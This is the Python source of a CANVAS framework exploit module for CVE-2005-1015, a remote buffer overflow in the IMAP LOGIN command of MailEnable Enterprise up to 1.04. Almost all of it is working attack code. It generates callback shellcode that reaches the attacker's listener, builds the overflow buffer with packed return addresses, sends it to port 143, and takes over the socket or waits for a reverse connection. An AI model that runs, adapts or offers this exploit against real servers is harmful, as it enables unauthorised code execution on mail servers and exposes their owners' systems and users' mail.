#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
import struct
import chunkedaddencoder

NAME="mailenable_imap"
DESCRIPTION="MailEnable IMAP Login overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="MailEnable"
DOCUMENTATION["Repeatability"]="Repeatable."
DOCUMENTATION["VersionsAffected"]="MailEnable Enterprise <= 1.04"
DOCUMENTATION["CVE Name"] = "CVE-2005-1015"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1015"
DOCUMENTATION['CVSS'] = 10.0

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NOTES="""

"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=143
        self.host=""
        self.badstring="\x00\r\n\x20"
        self.ssl=0
        self.setVersions()
        self.version=1
        self.searchbadstring="\x00\r\n? /\\&"
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, write&jmp
        self.versions[1]=("MailEnable Enterprise <= 1.04", 0x01210004) 
        #on Professional, only MSXML (not always installed) has a big enough .data section
        #this makes for a ... not optimal exploit
        #grr, this doesn't work at all
        #self.versions[2]=("MailEnable Professional <= 1.04", 0x69c12760) 
        


    def neededListenerTypes(self):
        #we steal the socket!
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        #self.shellcode="\xcc"*400
        #return 1
        if False:
            ret=self.createSmallWin32GOShellcode()
        else:
            #callback shellcode
            host=self.callback.ip
            port=self.callback.port
            ret=self.createSmallWin32Shellcode(host,port)

        #these are just the numbers from makesploit() below
        offset=492
        size=12
        subesp=5000
        self.easychunk(offset,size,subesp)
        #self.shellcode="\xcc"+self.shellcode
        self.log("Total length of shellcode=%d"%len(self.shellcode))

        return ret

    def test(self):
        """
        
        """
        #no banner, revisit
        self.version = 1
        return 1
    
    
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        try:
            data=s.recv(1000)
        except:
            data="Timeout"
        self.log("Server returned %s"%prettyprint(data[:300]))
        #only return 1 if we have a Savant string
        ret=data.count("")
        if ret:
            self.version=1
            return 1
        ret=data.count("")
        if ret:
            self.version=2
            return 1
        return 0
        
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            if not self.test():
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            data=s.recv(1000)
            self.log("Recved: %s"%data)
            s.sendall(sploitstring)
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0

        if self.checkTriggerWin32(s):
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return self.doGOMOSDEFWin32(s)
        
        try:
            data=s.recv(1000)
        except:
            data="Timeout"
        self.log("Recved: %s"%data)

        self.log("Sleeping for two seconds to check for callback")
        time.sleep(2)
        ret=self.ISucceeded()
        self.setInfo("%s attacking %s:%d - done (success=%d!)"%(NAME,self.host,self.port,ret))
        return ret

    def makesploit(self):
        
        addie = self.versions[self.version][1]
        buf = "A"*(0x400-len(self.shellcode)) + self.shellcode + \
              struct.pack("<L", 0x7ffdf004L) + struct.pack("<L", 0xdeadbeefL) + \
              struct.pack("<L", (addie + 0x100)) + struct.pack("<L", (addie - 0x177c0))
        sploitstring = "A001 LOGIN %s\r\n" % buf
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0,None]:
        ret.interact()
